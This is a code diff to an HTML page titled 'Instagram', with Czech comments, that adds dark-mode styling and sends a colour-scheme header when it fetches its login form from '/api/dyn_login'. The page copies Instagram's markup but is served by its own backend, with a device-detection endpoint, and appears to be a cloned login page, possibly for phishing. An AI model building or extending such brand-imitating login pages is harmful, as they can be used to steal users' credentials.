@@ -1,4 +1,4 @@
-<html class="_9dls _ar44 js-focus-visible _aa4c __fb-light-mode" lang="en" dir="ltr" data-js-focus-visible="">
+<html class="_9dls _ar44 js-focus-visible _aa4d __fb-dark-mode" lang="en" dir="ltr" data-js-focus-visible="">
 
 <head>
     <link data-default-icon="/static/images/login/VsNE-OHk_8a.png" rel="icon"
@@ -119,13 +119,32 @@
         crossorigin="anonymous">-->
     <!--EF-->
     <!--<link type="text/css" rel="stylesheet" href="/static/JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css">-->
+    <!--<link rel="preload" href="/static/kF9I-jTbzEwcyf8QhNEWE-MbVu6J6TSgCAgbkPiBd1Gm.css" as="style" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="/static/kF9I-jTbzEwcyf8QhNEWE-MbVu6J6TSgCAgbkPiBd1Gm.css">-->
+    <style data-btmanifest="1018537335_main" nonce="wQjO5T8Q">
+        @media (prefers-color-scheme: dark) {
+          :root {
+            background: #000;
+          }
+
+          #splash-screen {
+            background-color: #000;
+          }
+        }
+
+        @media (prefers-color-scheme: light) {
+            #splash-screen {
+                background: rgb(255, 255, 255);
+          }
+        }
+      </style>
 
     <title>Instagram</title>
 </head>
 
 <body class="_ar45 system-fonts--body segoe">
     <div id="splash-screen"
-        style="position: fixed; z-index: 100; background: rgb(255, 255, 255); top: 0px; left: 0px; width: 100%; height: 100%;">
+        style="position: fixed; z-index: 100; top: 0px; left: 0px; width: 100%; height: 100%;">
         <style type="text/css" nonce="">
             html {
                 overflow-y: scroll !important
@@ -141,7 +160,8 @@
     <div id="mount_0_0_kA">
     </div>
     <div id="css-link-dyn">
-        <!--<link type="text/css" rel="stylesheet"
+        <!--<link type="text/css" rel="stylesheet" href="/static/kF9I-jTbzEwcyf8QhNEWE-MbVu6J6TSgCAgbkPiBd1Gm.css" data-bootloader-hash="NCPvUZQ" data-async-css="1" crossorigin="anonymous" data-p=":39,14,13,12" data-btmanifest="1018534220_main" data-c="1">
+        <link type="text/css" rel="stylesheet"
             href="static/8j9UF0vTt3jcyf8QhNEWE-MbVu6J6TSgC.css"
             data-bootloader-hash="meZzMtU" data-async-css="1" crossorigin="anonymous" data-p=":37,12,13"
             data-btmanifest="1017713067_main" data-c="1">-->
@@ -185,11 +205,13 @@ function loadScript(url) {
 
 // Funkce pro přidání CSS do head a počkání na jeho načtení
 function addCSS(callback) {
+    const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    const mode = prefersDarkMode ? 'dark' : 'light';
     // Vytvoření <link> tagu pro CSS
     const link = document.createElement('link');
     link.rel = 'stylesheet';
     link.type = 'text/css';
-    link.href = '/static/JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css';
+    link.href = '/static/JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css'; //JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css kF9I-jTbzEwcyf8QhNEWE-MbVu6J6TSgCAgbkPiBd1Gm
     link.setAttribute('data-bootloader-hash', 'meZzMtU');
     link.setAttribute('data-async-css', '1');
     link.setAttribute('crossorigin', 'anonymous');
@@ -197,11 +219,7 @@ function addCSS(callback) {
     link.setAttribute('data-btmanifest', '1017713067_main');
     link.setAttribute('data-c', '1');
 
-    // Nastavení callback funkce pro 'onload' událost, která se spustí, když je CSS načteno
-    link.onload = function() {
-        console.log("CSS bylo úspěšně načteno.");
-        callback(); // Zavolá předanou callback funkci po načtení CSS
-    };
+
 
     // Přidání CSS do head
     document.head.appendChild(link);
@@ -209,19 +227,30 @@ function addCSS(callback) {
     // Přidání preload pro CSS
     const preloadLink = document.createElement('link');
     preloadLink.rel = 'preload';
-    preloadLink.href = '/static/JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css';
+    preloadLink.href = '/static/JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css'; //JRdvhfZIumFcyf8QhNEWE-MbVu6J6TSgC.css
     preloadLink.setAttribute('as', 'style');
     preloadLink.setAttribute('crossorigin', 'anonymous');
     document.head.appendChild(preloadLink);
+
+    // Nastavení callback funkce pro 'onload' událost, která se spustí, když je CSS načteno
+    link.onload = function() {
+        console.log("CSS bylo úspěšně načteno.");
+        callback(); // Zavolá předanou callback funkci po načtení CSS
+    };
 }
 
 async function fetchAndMountHTML() {
     try {
-        // Odeslání požadavku na server
+        // Zjistí, zda uživatel preferuje dark nebo light mode
+        const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        const mode = prefersDarkMode ? 'dark' : 'light';
+
+        // Odeslání požadavku na server s přidanou hlavičkou
         const response = await fetch('/api/dyn_login', {
             method: 'GET',
             headers: {
-                'Accept': 'text/html'
+                'Accept': 'text/html',
+                'User-Color-Scheme': mode // Přidání dark nebo light do hlavičky
             }
         });
 
@@ -238,7 +267,7 @@ async function fetchAndMountHTML() {
                 addCSS(function() {
                     setTimeout(function () {
                             document.querySelector("#splash-screen").classList.add("hidden");
-                    }, 1500);
+                    }, 300);
                     document.querySelector("#splash-screen").classList.add("hidden");
                 });
             } else {
@@ -436,10 +465,17 @@ fetch('/api/device_detection', {
     //console.error('Error with device detection:', error);
 });
 
-
-
+</script>
+<script>
+    //light/dark mode
+    //if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+    //    console.log("Uživatel preferuje tmavý režim.");
+    //} else {
+    //    console.log("Uživatel preferuje světlý režim.");
+    //}
 
 </script>
+
 </body>
 
 </html>
